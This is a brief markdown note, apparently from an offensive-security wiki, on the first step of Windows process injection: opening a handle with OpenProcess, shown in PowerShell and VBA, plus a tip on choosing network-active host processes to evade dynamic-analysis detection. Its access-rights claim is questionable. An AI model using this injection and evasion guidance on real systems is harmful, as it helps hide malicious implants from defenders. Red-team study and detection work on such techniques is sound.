---
author(s):
  - Userware
tags:
  - malware-development
  - implant-execution
  - process-injection
  - windows
---
# Inject Existing Process

## `OpenProcess`

> [!NOTE]
> `PROCESS_ALL_ACCESS` isn't required. Only `PROCESS_CREATE_PROCESS` is efficient.
> > [!TIP] Evade Dynamic Analysis Detection
> > Only inject processes that connects to the internet such as, a **web browser** or any anything communicates through the network. Injecting the payload through a **text editor** for example, will raise the alarms due to lack of socket networks. However, when unexpected circumstances may occur then implement it as a last resort.

### PowerShell

```powershell
$Win32Functions = New-Object System.Object

$OpenProcessAddress = Get-ProcAddress kernel32.dll OpenProcess
$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddress, $OpenProcessDelegate)
$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
```

### VBA

```vb
Const PROCESS_ALL_ACCESS = &H1F0FFF

Dim handle As LongPtr
Dim PID As Integer

PID = 4444
handle = OpenProcess(PROCESS_ALL_ACCESS, False, PID)
```

---
## References

### Source Repositories

- [Chvancooten: Process Injector](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Injector)

### Tenouk

- [Tenouk: Processes and Threads - WinAPIs - Part 6](https://www.tenouk.com/ModuleU.html)

- [Tenouk: Processes and Threads - WinAPIs - Part 7](https://www.tenouk.com/ModuleU1.html)

- [Tenouk: Processes and Threads - WinAPIs - Part 10](https://www.tenouk.com/ModuleU4.html)

### Hackmosphere

- [Hackmosphere: Bypass Windows Defender antivirus in 2025 - Evasion Techniques Using Direct Syscalls and XOR encryption - Part 2](https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-2/)